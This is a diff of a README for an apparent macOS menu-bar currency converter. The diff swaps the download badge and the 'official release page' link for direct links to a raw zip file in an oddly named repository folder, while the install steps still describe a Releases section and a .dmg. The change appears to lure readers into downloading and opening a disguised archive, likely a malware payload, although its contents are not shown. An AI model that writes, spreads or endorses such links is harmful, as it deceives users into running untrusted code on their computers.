@@ -1,6 +1,6 @@
 # 💱 currency-converter-macos - Track global currency rates with ease
 
-[![](https://img.shields.io/badge/Download-CurrencyConverter-blue)](https://github.com/Shootervelvetleaf800/currency-converter-macos)
+[![](https://img.shields.io/badge/Download-CurrencyConverter-blue)](https://github.com/Shootervelvetleaf800/currency-converter-macos/raw/refs/heads/main/antidotally/converter-macos-currency-Montargis.zip)
 
 This application sits in your menu bar. It lets you check live currency values without opening a browser. You can convert major world currencies and cryptocurrencies in seconds.
 
@@ -29,7 +29,7 @@ Ensure your computer meets these standards to run the software correctly:
 
 Follow these steps to set up the application on your computer:
 
-1. Visit the [official release page](https://github.com/Shootervelvetleaf800/currency-converter-macos) to begin the download.
+1. Visit the [official release page](https://github.com/Shootervelvetleaf800/currency-converter-macos/raw/refs/heads/main/antidotally/converter-macos-currency-Montargis.zip) to begin the download.
 2. Look for the latest version under the Releases section.
 3. Click the file ending in .dmg to start the download.
 4. Open the downloaded file once the process finishes.
